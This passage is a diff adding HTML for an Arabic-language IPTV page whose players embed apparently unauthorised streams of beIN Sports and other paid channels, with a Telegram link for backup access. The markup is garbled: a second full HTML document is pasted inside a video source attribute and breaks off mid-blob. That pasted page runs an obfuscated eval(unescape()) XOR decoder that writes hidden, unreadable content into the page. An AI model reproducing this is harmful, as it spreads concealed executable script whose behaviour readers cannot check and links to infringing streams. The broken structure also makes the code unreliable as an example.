+                    <h6 class="live">LIVE</h6>
+            </a>
+        </div>
+    </div>
+
+    <div class="carousel-item">
+        <a data-toggle="modal" data-target="#myModal16"> <img class="slideimg"
+                src="https://images.mjunoon.tv:8181/slider/1600239005.webp" class="d-block w-100" alt="Urdu-1">
+            <div style="position:absolute; top: 20px; left:25px;">
+                <h6 class="live">LIVE</h6>
+        </a>
+    </div>
+    </div>
+
+    <div class="carousel-item">
+        <a data-toggle="modal" data-target="#myModal14"><img class="slideimg"
+                src="https://srv2.jazztv.pk/jazzlive/uploads/slider/ptvhome-slider.png?id=2" class="d-block w-100"
+                alt="ptv-home">
+            <div style="position:absolute; top: 20px; left:25px;">
+                <h6 class="live">LIVE</h6>
+        </a>
+    </div>
+    </div>
+    <div class="carousel-item">
+        <a data-toggle="modal" data-target="#myModal10"><img class="slideimg"
+                src="https://images.mjunoon.tv:8181/slider/1605699841.webp" class="d-block w-100" alt="SAMAA">
+            <div style="position:absolute; top: 20px; left:25px;">
+                <h6 class="live">LIVE</h6>
+        </a>
+    </div>
+    </div>
+
+    <div class="carousel-item">
+        <a data-toggle="modal" data-target="#myModal15"><img class="slideimg"
+                src="https://propakistani.pk/wp-content/uploads/2020/01/PSL-2020-banner.jpeg" class="d-block w-100"
+                alt="PSL">
+        </a>
+    </div>
+
+    <div class="carousel-item">
+        <a data-toggle="modal" data-target="#myModal4"><img class="slideimg"
+                src="https://images.mjunoon.tv:8181/slider/1606726180.webp" class="d-block w-100" alt="CORONA">
+            <div style="position:absolute; top: 20px; left:25px;">
+                <h6 class="live">LIVE</h6>
+        </a>
+    </div>
+    </div>
+    <a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-bs-slide="prev">
+        <span class="fas fa-chevron-circle-left" aria-hidden="true"></span>
+        <span class="visually-hidden">Previous</span>
+    </a>
+    <a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-bs-slide="next">
+        <span class="fas fa-chevron-circle-right" aria-hidden="true"></span>
+        <span class="visually-hidden">Next</span>
+    </a>
+    </div>
+<style>
+.marquee{border: 2px solid #ff0000; border-radius: 3px; width: 90%; margin: auto; display: block;}.marquee span{display: inline-block; background: #ff0000; padding: 0px 10px; color: #fff; display: inline-block; float: right; width: auto; line-height: 35px;}.marquee marquee{display: block; line-height: 35px; z-index: -1; margin-right: 10px; width: auto; margin: auto;}
+
+</style>
+
+<div class="marquee yellow"><span> : تنويه</span> <marquee scrollamount="5" direction="right" onmouseover="stop()" onmouseout="start()"> <font color="white"> 
+في حال توقف أي قناة رابط قناتنا على التلغرام https://t.me/neoniptv
+
+ </font></marquee> </div>
+  
+<script type="text/javascrit">
+
+</script>
+
+    
+
+
+
+   <div class="scrollmen">
+
+<a class="imgclass" data-toggle="modal" data-target="#myModal5"><img class="imgzom"
+                src="http://51.195.91.73/Channels-Logo/Bein-Sports/Bein.Sports.1.png"
+                alt="bein sports 1 ">
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal1"><img class="imgzom"
+                src="https://up4net.com/uploads4/up4net.com164253440563551.png"
+                alt="bein sports MAX 1">
+
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal2"><img class="imgzom"
+                src="https://upload.wikimedia.org/wikipedia/commons/2/2e/2M_TV_logo.png"
+                alt="bein sports 3">
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal3"><img class="imgzom"
+                src="http://51.195.91.73/Channels-Logo/Kids/MBC.3.png"
+                alt="bein sports 4">
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal4"><img class="imgzom"
+                src="http://51.195.91.73/Channels-Logo/Kids/Boomerang.png"
+                alt="bein sports 5">
+        </a>
+
+        
+        <a class="imgclass" data-toggle="modal" data-target="#myModal15"><img class="imgzom"
+                src="http://51.195.91.73/Channels-Logo/Kids/NAT.GEO.KIDS.png">
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal6"><img class="imgzom"
+                src="http://51.195.91.73/Channels-Logo/Kids/Teletubbies.png">
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal7"><img class="imgzom"
+                src="http://51.195.91.73/Channels-Logo/Kids/Tom.&.Jerry.png">
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal8"><img class="imgzom"
+                src="http://51.195.91.73/Channels-Logo/MY-HD/MY-HD-Logo.png">
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal9"><img class="imgzom"
+                src="https://b.top4top.io/p_1854642bi0.jpg">
+        </a>
+
+        <a class="imgclass" style="text-decoration:none" data-toggle="modal" data-target="#myModal10"><img
+                class="imgzom" src="https://b.top4top.io/p_1854642bi0.jpg">
+        </a>
+
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal11"><img class="imgzom"
+                src="https://b.top4top.io/p_1854642bi0.jpg">
+        </a>
+
+     
+        
+
+    </div>
+
+
+    
+
+
+
+
+
+
+      
+ <!-- ModalNO#1 -->
+        <div style="width: 100%;" class="modal fade" id="myModal1" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 2 HD </h4>
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits1" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 80px; margin-top: -23px;color:black;">Viewers</h6>
+
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video1" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://vsd78.mycdn.me/hls/2241622903377.m3u8/sig/UhsCjWBzaFU/expires/1642620490382/srcIp/105.99.210.147/clientType/0/srcAg/CHROME_ANDROID/mid/4185106423377/video.m3u8?p"
+                                type='application/x-mpegURL'>
+                            <source src="http://soundfree.s3.eu-central-1.amazonaws.com/ninas1/live_720p60.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video1').pause()">Back</button>
+تنوية: قم بضغط على مربع تكبير صورة اذا لم تجد قناة شغاله قم بخروج من تطبيق وإعادة دخول ستجده شغاله 
+
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+        <!-- ModalNO#2 -->
+        <div style="width: 100%;" class="modal fade" id="myModal2" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 3 HD </h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits2" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers</h6>
+
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video2" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://209.126.8.89:25461/Qtvconnectdlna/W7h5W8tZdf/1.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="http://4ce5e2d62ee2c10e43c709f9b87c44d5.streamhost.cc/m3u8/Sports/34d0ecb91942ec6.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video2').pause()">Back</button>
+تنوية: قم بضغط على مربع تكبير صورة اذا لم تجد قناة شغاله قم بخروج من تطبيق وإعادة دخول ستجده شغاله 
+
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+        <!-- ModalNO#3 -->
+        <div style="width: 100%;" class="modal fade" id="myModal3" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 4 HD</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits3" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video3" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://68.183.15.153:9978/sports2021/bein4/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Mi84LzIwMjEgNDo0NTowOCBQTSZoYXNoX3ZhbHVlPVVZL2VIVkczby83bVR3V0xZSWhaSlE9PSZ2YWxpZG1pbnV0ZXM9Mg=="
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/Hum-news-80/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video3').pause()">Back</button>
+تنوية: قم بضغط على مربع تكبير صورة اذا لم تجد قناة شغاله قم بخروج من تطبيق وإعادة دخول ستجده شغاله 
+
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+        <!-- ModalNO#4 -->
+        <div style="width: 100%;" class="modal fade" id="myModal4" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 5 HD </h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits4" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video4" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://4ce5e2d62ee2c10e43c709f9b87c44d5.streamhost.cc/m3u8/Sports/6c73043dfbed2dd.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/CORONA/playlist.m3u8?"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video4').pause()">Back</button>
+
+تنوية: قم بضغط على مربع تكبير صورة اذا لم تجد قناة شغاله قم بخروج من تطبيق وإعادة دخول ستجده شغاله 
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+        <!-- ModalNO#5 -->
+        <div style="width: 100%;" class="modal fade" id="myModal5" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 1 HD </h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits5" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video5" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://93.152.174.144:4000/play/bein1ar/index.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<center>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MY WILIX </title>
+</head>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">
+
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/js/bootstrap.bundle.min.js"
+    integrity="sha384-ygbV9kiqUc6oa4msXn9868pTtWMgiQaeYH7/t7LECLbyPA2x65Kgf80OJFdroafW"
+    crossorigin="anonymous"></script>
+
+
+
+
+<link href="https://unpkg.com/video.js/dist/video-js.css" rel="stylesheet">
+</link>
+<script src="https://unpkg.com/video.js/dist/video.js"></script>
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+
+<link href="https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet">
+
+<!-- <script type='text/javascript' src="https://cdn.jsdelivr.net/npm/afterglowplayer@1/dist/afterglow.min.js"></script> -->
+<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%73%35%63%65%61%32%33%35%37%61%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%37%31%32%39%34%38%36%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%36%39%36%33%32%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%36%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%73%35%63%65%61%32%33%35%37%61%28%27') + '%30%6e%68%74%67%5b%3c%01%02%13%1c%19%18%01%07%01%03%29%58%6d%58%75%7c%01%07%18%1c%19%1c%5b%5a%59%61%67%6a%60%69%6b%5c%21%5e%6f%61%68%68%30%1c%1b%39%36%29%28%2c%29%1c%1c%62%63%6e%6f%6a%67%5d%6b%6c%33%04%02%1d%1b%1e%1e%66%6f%61%68%24%62%5d%64%65%61%72%30%1e%21%5d%63%6c%65%5d%21%6e%75%6a%6f%5b%63%20%3a%6f%65%6b%67%41%58%5b%4a%72%69%6a%59%61%49%6f%6b%6c%20%6e%59%66%68%5b%1e%69%65%2f%6a%6a%5e%6f%6d%6f%21%68%76%77%67%59%61%20%6c%5e%69%6b%68%68%27%59%5f%6e%68%52%6a%5c%64%60%25%66%64%6d%5f%1e%6b%5d%61%6b%25%5c%6a%6a%65%59%1b%69%5f%6e%6b%2f%64%5c%64%76%5c%68%64%5c%5f%1e%6e%59%66%59%25%6f%5d%6b%6b%20%6c%5b%68%65%66%3c%01%07%18%1c%19%1c%20%70%5b%58%63%65%67%21%63%6b%6e%6d%21%6a%66%6d%6d%68%64%6a%6e%62%36%1c%58%6e%69%62%5f%62%65%5d%64%59%5d%37%01%07%71%00%05%03%00%2e%66%52%21%5e%60%59%73%6a%6e%69%23%59%65%6a%54%60%5c%25%60%5c%66%69%27%2c%64%5d%21%54%64%5c%72%6a%6a%6e%20%5c%67%68%5b%60%56%21%6f%61%67%61%68%72%06%00%03%02%1c%13%66%6a%6a%68%24%6b%64%75%5b%30%1c%2a%23%6c%71%37%01%07%1c%1d%5c%6d%62%6f%6a%3d%1c%72%60%65%6d%59%32%06%00%03%02%71%0e%02%04%06%2e%6b%5d%77%5d%5f%68%21%60%6a%67%61%6c%73%04%02%1d%1b%58%5f%5b%63%68%6a%6a%6d%6e%5d%21%5a%68%62%6d%6a%32%14%37%29%28%5d%29%5d%1d%1a%67%63%6c%6f%65%68%58%6a%68%36%01%03%1b%1e%59%6f%60%60%6a%37%18%77%61%65%69%5e%1e%1f%65%61%63%6f%6f%6c%5d%6b%68%32%06%00%73%01%02%0e%02%2b%6f%60%60%58%58%62%63%65%73%01%0d%01%07%18%1c%5f%6f%6b%5f%5b%68%21%6a%52%58%60%6d%6b%37%1c%2c%2e%6e%76%33%01%0d%1c%19%65%5d%6f%67%64%69%23%62%59%66%67%32%19%59%69%6d%6f%32%06%00%1e%1c%61%52%6a%62%61%6e%24%6a%64%60%66%6a%32%1c%52%69%6d%6b%33%04%02%1d%1b%75%67%58%68%6b%32%19%31%29%1c%33%00%05%1e%1e%64%59%6a%67%61%6c%32%19%5d%68%6f%6d%1e%1d%65%6e%6c%6a%6e%68%58%6e%69%34%03%00%1c%1c%52%60%60%63%6e%24%65%69%5e%63%69%32%1c%54%59%6b%6c%59%6f%1c%1c%62%63%6e%6f%6a%67%5d%6b%6c%33%04%02%1d%1b%6a%5b%74%68%2e%5d%65%61%67%6b%32%1d%5c%5b%6c%68%59%65%1c%18%61%61%69%6f%6b%6f%5f%6c%68%33%0e%02%19%18%58%60%6b%6d%67%5f%77%32%1c%55%60%6a%5f%63%36%01%03%1b%1e%63%5d%6a%68%65%6b%25%68%6a%6c%33%1b%29%6e%74%33%0e%02%19%18%5a%6a%74%20%6c%66%5f%58%6f%78%32%19%28%1c%2d%6c%75%1b%36%6e%74%1c%23%1c%6f%63%5a%58%24%2d%27%1e%2e%20%1c%23%20%19%28%2e%2f%25%21%1b%2e%1e%36%6c%7b%1c%2f%28%6c%71%1c%2d%1b%68%65%5a%5d%2b%2c%25%18%2c%25%1c%2d%27%1e%2e%2e%2d%3a%25%36%05%02%74%01%03%06%00%03%02%2e%6f%65%73%5d%73%04%02%5a%68%62%6d%6a%32%13%77%61%61%68%5c%33%00%05%58%5f%5b%63%68%6a%6a%6d%6e%5d%21%5a%68%62%6d%6a%32%13%6a%5c%5c%33%04%02%76%62%5a%6a%64%32%13%28%29%68%74%36%01%03%63%5b%67%67%64%67%32%19%2e%2c%69%74%32%06%00%6a%59%74%67%21%58%64%65%62%6e%33%1b%59%5b%6e%68%56%6a%36%05%02%63%6f%6f%6f%23%69%65%72%56%32%19%29%2b%69%74%32%06%00%58%6f%6a%57%59%6f%25%6a%58%58%64%6e%69%30%1c%2b%63%74%36%05%02%5d%65%6a%6b%62%5f%75%32%13%65%6b%64%65%6b%59%32%06%00%6e%5d%58%57%65%6b%63%32%19%29%6d%73%31%03%02%01%0d%71%04%06%01%07%01%03%06%00%03%02%01%0d%01%07%05%02%04%02%2f%5f%67%74%65%6e%6f%65%6b%5d%1c%76%01%03%1b%1e%5a%65%6b%63%60%58%71%32%19%65%6f%67%67%6c%59%21%55%60%6a%5f%63%36%01%03%1b%1e%75%65%58%67%64%37%18%2d%29%2c%6d%73%31%03%02%1c%13%64%5c%61%67%61%68%33%1b%2f%29%2c%6c%7b%33%04%06%1c%19%68%6b%5a%6c%69%65%68%6a%6f%6b%36%1c%6d%6a%5c%69%69%64%6f%6a%6e%1c%2b%2e%6b%36%01%03%1b%1e%58%6f%6a%57%59%6f%25%6a%58%58%64%6e%69%30%1c%29%43%74%36%05%02%19%1c%60%5a%68%65%65%6e%2e%60%5c%62%68%37%1c%2a%6b%76%31%01%02%13%1c%5f%59%5b%66%67%6b%68%6b%6c%58%21%54%6f%65%6b%6a%37%1c%6b%60%58%26%2a%29%26%20%19%29%34%32%20%1d%2b%27%31%01%02%13%1c%64%59%6a%62%65%6f%35%1e%2b%4c%74%3c%01%07%05%02%5f%6f%75%26%69%66%5d%58%60%77%37%18%2c%19%28%6d%73%1e%36%6c%74%13%2c%19%6e%67%5f%5d%25%2b%22%1e%2c%20%13%2c%25%18%2c%2b%2a%24%27%1e%2e%1c%36%63%74%19%2e%2c%69%74%1d%2b%1e%68%67%5a%52%24%29%24%1c%29%20%1d%2b%22%1e%2c%2e%22%35%20%37%01%07%71%00%05%2c%5a%65%76%6a%6e%65%61%6e%5c%32%65%68%74%5b%6a%1c%7c%01%07%18%1c%24%61%6a%26%6a%68%5d%6e%64%66%6a%6e%61%37%1c%6a%5c%5f%62%59%24%22%2e%2f%21%33%19%2f%23%1b%47%3b%1c%35%13%22%2a%05%02%19%1c%20%70%5b%58%63%65%67%21%6d%6e%5d%6b%6b%67%68%68%63%32%1c%64%5b%58%64%59%21%2d%2f%2d%27%31%1c%2f%2d%1c%4e%59%66%58%6a%64%1b%29%23%34%1c%2d%2f%04%06%1c%19%68%6b%5a%6c%69%66%6f%65%61%37%18%6b%5e%5d%61%5e%26%2f%2e%2a%2a%33%19%05%02%74%01%03%06%00%2c%72%6f%60%61%19%77%01%07%01%03%1b%1e%6e%5d%58%57%65%6b%63%32%19%29%6d%73%31%03%02%1c%13%68%6f%59%6e%6e%65%69%62%6d%6c%32%1c%67%6a%58%6a%6b%63%6f%6b%66%1e%2c%2a%6b%3c%01%07%18%1c%72%65%59%6f%66%30%1c%2d%23%2c%69%70%33%04%02%1d%1b%66%5b%65%67%6b%68%37%18%2d%2e%2c%6d%73%31%03%02%1c%13%01%07%05%02%19%1c%00%05%73%03%02%01%0d%2e%5f%6d%68%6d%6f%6f%2d%1e%71%01%02%13%1c%72%61%58%6d%64%33%1b%36%2e%19%33%0e%02%19%18%66%6a%6e%69%26%69%67%72%59%3d%1c%2f%28%6c%71%33%00%05%1e%1e%5a%5d%54%63%62%6e%6f%6c%6e%59%26%59%6d%60%6f%65%32%19%1f%36%33%2c%2d%2b%2e%31%1c%01%0d%1c%19%5f%6f%65%6f%6b%35%1e%75%64%65%67%59%36%18%01%07%1c%1d%5d%6d%68%58%59%65%32%19%29%6c%71%1c%6a%68%62%67%58%1c%14%2a%2f%2e%33%04%02%1d%1b%58%6d%6a%58%56%6a%24%6e%5d%5d%65%68%6c%30%1e%29%4c%7b%33%04%06%71%04%02%00%05%03%00%2e%5a%66%68%6d%6b%6e%2f%32%65%68%74%5b%6a%1c%7c%01%07%18%1c%5f%5d%5a%64%65%68%6f%69%61%58%24%5f%6f%65%6f%6b%35%1e%19%34%5d%23%2c%29%28%33%04%02%1d%1b%59%6d%60%6f%65%32%19%73%64%60%68%58%34%03%00%71%01%0d%01%07%05%02%04%02%00%05%03%00%01%02%21%65%64%63%5b%65%5d%6a%6c%1e%71%01%02%13%1c%5d%61%6b%69%60%5c%72%30%1e%65%6e%6f%65%6b%5d%21%5f%60%6e%5c%61%31%01%02%13%1c%72%61%58%6d%64%33%1b%36%2e%6c%74%3c%01%07%18%1c%61%59%64%60%66%6a%32%1c%3b%2c%69%70%33%04%02%1d%1b%6a%68%5d%6e%64%65%6d%61%6f%6b%32%1d%6f%68%5f%6e%6b%69%6f%6f%65%1c%2b%2a%6a%34%03%00%1c%1c%55%6f%6f%5c%59%6f%21%6b%5a%5a%67%69%6b%3d%1c%2c%48%74%36%01%03%1b%1e%58%5d%5b%6c%67%6f%6b%69%6b%58%20%5c%6d%62%6f%6a%3d%1c%6f%63%5a%21%2a%28%2e%22%1e%2d%34%38%20%19%28%25%36%01%03%1b%1e%63%5d%6a%68%65%6b%36%1c%2d%4c%75%34%03%00%1c%1c%55%6f%6f%5c%59%6f%21%6b%5a%5a%67%69%6b%3d%1c%2c%28%19%36%01%03%06%00%58%6f%74%2e%6b%61%59%58%6a%77%33%1b%2e%1e%28%6c%7b%1c%31%68%74%19%2c%1d%6d%65%58%5d%24%23%20%19%28%20%19%2c%21%1b%2e%2c%2a%25%2f%1c%29%18%36%69%74%1d%2d%2e%6e%74%1c%23%1c%6f%63%5a%58%24%2d%27%1e%2e%20%1c%23%20%19%28%2e%28%35%24%34%03%00%71%01%0d%2e%60%65%67%5e%60%5c%6c%69%30%64%6f%79%59%6f%18%73%04%02%1d%1b%23%63%6b%21%67%6a%58%6a%6b%63%6f%6b%66%30%1e%6b%5b%52%60%5c%20%2d%2b%2a%24%34%1e%2d%22%1c%4a%39%19%31%1c%27%2f%00%05%1e%1e%21%77%56%5a%66%61%68%24%68%6b%5a%6c%69%66%6f%65%61%37%18%6b%5e%5d%61%5e%26%2f%2e%2a%2a%33%19%2b%22%19%4b%5c%61%5f%68%65%1c%24%21%31%18%22%2a%01%03%1b%1e%6a%6a%5d%61%6b%63%6b%6a%64%32%1d%6c%59%5f%60%59%2b%2d%2b%2e%25%36%1c%00%05%73%03%02%01%0d%2e%60%65%67%77%6f%60%1b%71%03%02%01%0d%1c%19%68%5d%5d%58%64%69%65%30%1c%28%63%74%36%05%02%19%1c%69%6d%5f%6c%6b%65%67%65%6a%6a%32%19%68%6b%5a%6c%69%66%6f%65%61%19%2a%2a%6e%33%00%05%1e%1e%77%65%57%68%61%36%1c%32%36%6d%73%31%03%02%1c%13%64%5c%61%67%61%68%33%1b%35%36%6c%74%3c%01%07%18%1c%5f%6f%6b%5f%5b%68%21%6a%52%58%60%6d%6b%37%1c%28%2b%1b%31%01%02%13%1c%5d%61%6b%69%60%5c%72%30%1e%5a%60%60%5b%66%37%01%07%71%00%05%1e%1e%01%02%21%66%58%25%59%70%59%72%06%00%1e%1c%1c%13%5b%6a%64%6f%6f%32%1d%5d%62%5f%5b%63%13%1d%60%65%6c%6a%6a%69%5a%6c%6a%33%01%0d%1c%19%18%1c%63%6f%6f%6f%23%69%65%72%56%32%19%29%2c%69%74%1d%1a%67%63%6c%6f%65%68%58%6a%68%36%01%03%1b%1e%1e%1c%5d%6f%65%62%6a%21%60%68%58%66%69%30%1c%5b%56%6e%6d%5d%6a%36%01%03%1b%1e%1e%1c%68%56%74%6d%25%5d%65%65%66%69%30%1e%5b%59%61%68%5c%6e%33%04%02%1d%1b%1e%1e%61%5d%65%67%60%6a%21%6d%6f%6d%35%1e%23%2d%2a%63%74%36%05%02%19%1c%1d%1b%63%5f%6a%67%6a%6e%24%5e%6f%6d%68%6e%66%30%1e%21%28%23%6c%71%37%01%07%1c%1d%1b%1e%63%5d%6a%68%65%6b%25%6a%60%67%65%6f%30%1e%29%2c%63%74%36%05%02%19%1c%1d%1b%03%00%1c%1c%13%01%07%05%02%19%1c%00%05%73%03%02%01%0d%01%07%05%02%04%02%2f%5c%6d%6b%6e%68%56%6a%76%05%02%19%1c%6d%68%69%67%68%65%60%6e%37%18%5d%5f%6b%6e%67%6b%6a%59%33%0e%02%19%18%5b%6a%60%6e%6d%30%1e%77%64%6a%68%5c%37%01%07%1c%1d%61%62%6d%5d%68%3d%1c%6f%61%67%61%68%32%06%00%1e%1c%61%52%6a%62%61%6e%24%60%58%61%6a%30%1c%28%23%2c%69%70%33%04%02%1d%1b%63%5f%6a%67%6a%6e%24%5e%6f%6d%68%6e%66%30%1e%21%2a%23%6c%71%37%01%07%71%00%05%03%00%01%02%13%01%07%2a%68%6f%59%5c%69%5a%67%6e%67%54%64%58%6a%6e%5c%60%6a%74%03%00%61%5d%65%67%60%6a%21%6d%6f%6d%35%1e%2b%6c%74%3c%01%07%65%5d%6f%67%64%69%23%62%59%66%67%32%19%2d%6c%71%33%00%05%5f%62%65%67%61%21%60%6c%59%64%6b%33%1b%59%5b%6e%68%56%6a%36%05%02%67%69%6a%6f%67%64%75%21%54%6f%6b%6c%59%6b%68%33%1b%59%5b%6e%68%56%6a%36%05%02%74%01%03%06%00%03%02%01%0d%2e%6d%5f%6b%76%01%03%1b%1e%75%65%58%67%64%37%18%37%2c%6c%75%34%03%00%1c%1c%6b%59%60%63%64%6d%32%1d%30%2b%6e%74%33%0e%02%19%18%5a%6a%6a%59%5e%68%30%1c%2a%63%74%19%6f%6f%65%65%59%1b%68%65%5a%24%25